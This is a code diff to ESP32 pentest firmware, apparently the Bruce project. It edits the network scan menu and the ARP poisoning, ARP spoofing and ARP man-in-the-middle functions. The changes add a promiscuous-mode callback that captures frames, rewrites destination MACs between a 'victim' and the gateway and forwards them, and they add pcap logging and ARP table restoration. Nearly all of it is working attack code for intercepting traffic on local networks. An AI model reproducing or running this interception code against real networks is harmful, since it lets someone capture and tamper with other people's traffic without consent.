@@ -80,8 +80,8 @@ void local_scan_setup() {
 
         options = {};
         for(auto host:hostslist) {
-          String result = host.ip.toString().substring(host.ip.toString().lastIndexOf('.') - 1);
-          if( host.ip == gateway ) result += "(GATE)";
+          String result = host.ip.toString();
+          if( host.ip == gateway ) result += "(GTW)";
           options.push_back({result.c_str(), [=](){ afterScanOptions(host); }});
         }
         options.push_back({"Main Menu", [=]() { backToMenu(); }});
@@ -95,17 +95,25 @@ void local_scan_setup() {
 }
 
 void afterScanOptions(const Host& host) {
+  int opt=0;
   options = {
-    {"Host info", [=](){ hostInfo(host); }},
+    {"Host info",       [=](){ hostInfo(host); }},
   #ifndef LITE_VERSION
-    {"SSH Connect", [=](){ ssh_setup(host.ip.toString()); }},
+    {"SSH Connect",     [=](){ ssh_setup(host.ip.toString()); }},
   #endif
-    {"ARP Poisoning", [=](){ arpPoisoner(); }},
-    {"ARP Spoofing", [=](){ arpSpoofing(host, false); }},
+    {"ARP Poisoning",   [=](){ arpPoisoner(); }},
+    {"ARP Spoofing",    [=](){ arpSpoofing(host, false); }},
   };
-  if(sdcardMounted) options.push_back({"ARP MITM", [=](){ arpSpoofing(host, true); }});
+  if(sdcardMounted && bruceConfig.devMode) options.push_back(
+  //options.push_back(
+    {"ARP MITM (WIP)",  [&](){ opt=5;  }}
+    );
   loopOptions(options);
   delay(200);
+  if(opt==5)  { 
+    Serial.println("Starting MITM");
+    arpSpoofing(host, true);
+  }
 }
 
 void hostInfo(const Host& host) {
@@ -252,7 +260,6 @@ void sendARPPacket(uint8_t *targetIP, uint8_t *targetMAC, uint8_t *spoofedIP, ui
   netif->linkoutput(netif, p);
   pbuf_free(p);
   Serial.println("Pacote ARP enviado!");
-  tft.println("Pacote ARP enviado!");
 
   // Capturar o pacote no arquivo PCAP
   if (pcapFile) {
@@ -278,9 +285,22 @@ bool parseIPString(const String &ipStr, uint8_t *ipArray) {
 
 // gateway and clients MAC for callback
 uint8_t gatewayMAC[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF}; 
-uint8_t clientMAC[6] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66}; 
+uint8_t victimMAC[6] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66}; 
 uint8_t myMAC[6];  // MAC do ESP32
 File pcapFile;
+
+unsigned long crc32iso_hdlc(unsigned long crc, uint8_t const *mem, size_t len) {
+    unsigned char const *data = mem;
+    if (data == NULL)
+        return 0;
+    crc ^= 0xffffffff;
+    while (len--) {
+        crc ^= *data++;
+        for (unsigned k = 0; k < 8; k++)
+            crc = crc & 1 ? (crc >> 1) ^ 0xedb88320 : crc >> 1;
+    }
+    return crc ^ 0xffffffff;
+}
 
 // Callback para processar pacotes no modo Promiscuous
 void mitmCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
@@ -290,33 +310,59 @@ void mitmCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
 
   wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*) buf;
   wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;
-  uint8_t* payload = pkt->payload;
   // preamble (8 bytes) + destMAC(6 bytes) + srcMAC(6 bytes)
-  uint8_t* destMAC = payload + 8;
-  uint8_t* srcMAC = payload + 14;
+  uint8_t* destMAC = pkt->payload + 4 ;
+  uint8_t* srcMAC = pkt->payload + 10;
 
+  
   // Verifica se o pacote é destinado ao ESP32
-  if (memcmp(destMAC, myMAC, 6) == 0) {
+  if (memcmp(destMAC, myMAC, 6) == 0 || memcmp(srcMAC, myMAC, 6) == 0) {
+    //for(int i=4; i<16; i++) {
+    //  Serial.print(pkt->payload[i],HEX); 
+    //  Serial.print(" ");
+    //}
+    //Serial.print(" - destMAC ");
+    //for(int i=0; i<6; i++) { Serial.print(destMAC[i],HEX); Serial.print(" "); }
+    //Serial.print(" - My MAC ");
+    //for(int i=0; i<6; i++) { Serial.print(myMAC[i],HEX); Serial.print(" "); }
+    //Serial.println();
+
+    //Serial.print(" - srcMAC ");
+    //for(int i=0; i<6; i++) { Serial.print(srcMAC[i],HEX); Serial.print(" "); }
+    //Serial.print(" - GTW MAC ");
+    //for(int i=0; i<6; i++) { Serial.print(gatewayMAC[i],HEX); Serial.print(" "); }
+    //Serial.print(" - clientMAC MAC ");
+    //for(int i=0; i<6; i++) { Serial.print(victimMAC[i],HEX); Serial.print(" "); }
+    //Serial.println();
+
     uint32_t timestamp = now(); // current timestamp
     uint32_t microseconds = (unsigned int)(micros() - millis() * 1000); // microseconds offset (0 - 999)
-
     uint32_t len = ctrl.sig_len;
+
+    for(int i = 0; i<len;i++) { Serial.print(pkt->payload[i],HEX); Serial.print(" "); }
+    Serial.print("->");
+    unsigned long crc=0;
+    crc=crc32iso_hdlc(crc,pkt->payload,len);
+    Serial.println(crc,HEX);
+
     if(type == WIFI_PKT_MGMT) {
       len -= 4; // Need to remove last 4 bytes (for checksum) or packet gets malformed # https://github.com/espressif/esp-idf/issues/886
     }
-    newPacketSD(timestamp, microseconds, len, pkt->payload, pcapFile); // If it is to save everything, saves every packet
-
+    //newPacketSD(timestamp, microseconds, len, pkt->payload, pcapFile); // If it is to save everything, saves every packet
+    Serial.print("packet->");
     // Encaminha para o cliente se veio do gateway
     if (memcmp(srcMAC, gatewayMAC, 6) == 0) {
-      memcpy(destMAC, clientMAC, 6); // Ajusta MAC de destino
+      memcpy(destMAC, victimMAC, 6); // Ajusta MAC de destino
       //What happens with checkSUM???
-      esp_wifi_80211_tx(WIFI_IF_AP, payload, pkt->rx_ctrl.sig_len, false);
+      Serial.println("Client");
+      esp_wifi_80211_tx(WIFI_IF_STA, pkt->payload, pkt->rx_ctrl.sig_len, true);
     }
     // Encaminha para o gateway se veio do cliente
-    else if (memcmp(srcMAC, clientMAC, 6) == 0) {
+    else if (memcmp(srcMAC, victimMAC, 6) == 0) {
       memcpy(destMAC, gatewayMAC, 6); // Ajusta MAC de destino
       //What happens with checkSUM???
-      esp_wifi_80211_tx(WIFI_IF_STA, payload, pkt->rx_ctrl.sig_len, false);
+      Serial.println("Gtw");
+      esp_wifi_80211_tx(WIFI_IF_STA, pkt->payload, pkt->rx_ctrl.sig_len, true);
     }
   }
 }
@@ -324,10 +370,7 @@ void mitmCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
 void arpSpoofing(const Host& host, bool mitm) {
 
   uint8_t gatewayIP[4];
-  uint8_t victimIP[4]; // Endereço IP da vítima
-  uint8_t gatewayMAC[6];  // MAC do Gateway
-  uint8_t victimMAC[6];  // MAC da vítima
-  
+  uint8_t victimIP[4]; // Endereço IP da vítima  
 
   static int nf=0;
   FS *fs;
@@ -338,7 +381,7 @@ void arpSpoofing(const Host& host, bool mitm) {
   }
   if(!fs->exists("/BrucePCAP")) fs->mkdir("/BrucePCAP");
   while(fs->exists(String("/BrucePCAP/ARP_session_" + String(nf++) + ".pcap").c_str())) yield();
-  pcapFile = fs->open(String("/BrucePCAP/ARP_session_" + String(nf) + ".pcap").c_str());
+  pcapFile = fs->open(String("/BrucePCAP/ARP_session_" + String(nf) + ".pcap").c_str(), FILE_WRITE);
   
   writeHeader(pcapFile); // write pcap header into the file
 
@@ -388,6 +431,13 @@ void arpSpoofing(const Host& host, bool mitm) {
 
     Serial.println("Promiscuous mode deactivated.");
   }
+
+  // Restore ARP Table
+  sendARPPacket(victimIP, victimMAC, gatewayIP, gatewayMAC, pcapFile);
+  sendARPPacket(gatewayIP, gatewayMAC, victimIP, victimMAC, pcapFile);
+
+  pcapFile.flush();
+  pcapFile.close();
 
 }
 
